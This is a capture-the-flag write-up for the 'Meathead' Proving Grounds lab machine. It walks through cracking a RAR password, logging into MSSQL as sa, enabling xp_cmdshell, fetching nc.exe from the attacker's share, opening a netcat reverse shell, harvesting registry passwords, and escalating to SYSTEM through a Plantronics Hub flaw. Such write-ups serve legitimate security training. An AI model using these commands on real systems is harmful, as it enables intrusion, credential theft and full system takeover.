---
description: Writeup for Meathead from Offensive Security Proving Grounds (PG)
---

# Meathead

## Information Gathering

### Service Enumeration

`nmapAutomator.sh -H 192.168.75.70 -t full`

![](../../.gitbook/assets/605561df97f64596b04a92974b9a0ac1.png)

`nmapAutomator.sh -H 192.168.75.70 -t vulns`

### HTTP \(80\)

![](../../.gitbook/assets/1f279e31ab6d46899ec3ecaa557b7da5.png)

Tried:

* SQL Injection

### SMB \(139/445\)

Tried:

* Null sessions

### FTP \(1221\)

* Without using passive mode, hangs on `150 Opening ASCII mode data connection`

![](../../.gitbook/assets/be3a0fe5112d4f1e990ca139668517d2.png)

* Using the `-p` parameter to force passive mode: `ftp -p 192.168.75.70 1221`

![](../../.gitbook/assets/4996bd333b6149b398c9b605c9b3312e.png)

The `MSSQL_BAK.rar` looks interesting. It is password protected.

Extract the RAR hash: `rar2john MSSQL_BAK.rar > crackme`

Crack the hash: `john --wordlist=/usr/share/wordlists/rockyou.txt crackme`

![](../../.gitbook/assets/be05f5aa3597411985b54766b63a2732.png)

We find the password `letmeinplease`.

Unrar the file: `unrar e MSSQL_BAK.rar`

![](../../.gitbook/assets/fef40f15c15949d39d59d7cc6bd8c623.png)

Inside the archive is a text file.

![](../../.gitbook/assets/bcac23cee86b494f93ef89be31b4837c.png)

The credentials are `sa:EjectFrailtyThorn425`.

### MSSQL \(1435\)

Using the previously found credentials, login using `mssqlclient.py`.

`mssqlclient.py -p 1435 sa:EjectFrailtyThorn425@192.168.217.70`

## Exploitation

Once in, we can enable code execution using the `enable_xp_cmdshell` command.

Then, execute a command: `xp_cmdshell whoami /all`

![](../../.gitbook/assets/297d64d77c6d4e5eb204424014a897f0.png)

Transfer `nc.exe` to a writable directory:

`xp_cmdshell copy \\192.168.49.217\ROPNOP\nc.exe c:\Users\Public\nc.exe`

Then, trigger a reverse shell \(try a few common ports, port 80 works in this case\):

`xp_cmdshell c:\Users\Public\nc.exe -e cmd.exe 192.168.49.217 80`

Unfortunately we don't have access to `local.txt` just yet.

![](../../.gitbook/assets/e9b6a8ecb65f47859546a3a00267abc7.png)

Using `reg query HKLM /f pass /t REG_SZ /s`, we find an interesting password.

![](../../.gitbook/assets/bf796dbfd552403f95a5201e9f2bbdc1.png)

Using the credentials `jane:TwilightAirmailMuck234`, we can RDP in as Jane.

![](../../.gitbook/assets/68c1274ba7dc42ff94543a6045b0ad50.png)

## Privilege Escalation

On Desktop we find a Platronics Hub app \(version 3.13.2\)

![](../../.gitbook/assets/769fd95617364c6bbd4383f512c466de.png)

This version suffers from a local privilege escalation vulnerability: `https://www.exploit-db.com/exploits/47845`

Create a `MajorUpgrade.config` with the following contents:

```text
jane|advertise|C:\Windows\System32\cmd.exe
```

Upon saving this file, we get a SYSTEM shell.

![](../../.gitbook/assets/9cb912ba5a9a47849133f918ac7b380e.png)

![](../../.gitbook/assets/23527fd64be54d63a0972e5317d20f5d.png)

